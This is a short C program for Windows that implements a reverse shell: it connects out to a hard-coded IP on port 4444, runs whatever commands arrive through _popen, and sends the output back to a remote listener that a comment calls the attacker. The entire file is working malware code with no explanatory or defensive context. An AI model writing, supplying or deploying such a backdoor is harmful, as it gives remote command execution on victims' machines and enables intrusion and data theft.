#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib") // Link to Winsock library

#define PORT 4444
#define IP "10.0.1.35"  // Set this to the target machine's IP address

void init_socket() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        exit(1);
    }
}

int main() {
    SOCKET sock;
    struct sockaddr_in server;
    char *command;
    FILE *fp;

    init_socket(); // Initialize Winsock

    sock = socket(AF_INET, SOCK_STREAM, 0);  // Create socket
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed\n");
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);  // Port 4444
    server.sin_addr.s_addr = inet_addr(IP);  // Target IP

    // Try to connect to the remote server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connection failed\n");
        return 1;
    }

    while (1) {
        char buffer[1024];

        // Receive command from server
        memset(buffer, 0, sizeof(buffer));
        recv(sock, buffer, sizeof(buffer), 0);

        // Execute the received command
        fp = _popen(buffer, "r");  // Open command for reading
        if (fp == NULL) {
            send(sock, "Failed to execute command\n", 25, 0);
            continue;
        }

        // Send command output back to attacker
        while (fgets(buffer, sizeof(buffer), fp)) {
            send(sock, buffer, strlen(buffer), 0);
        }

        fclose(fp);
    }

    closesocket(sock);  // Close socket
    WSACleanup();  // Clean up Winsock
    return 0;
}
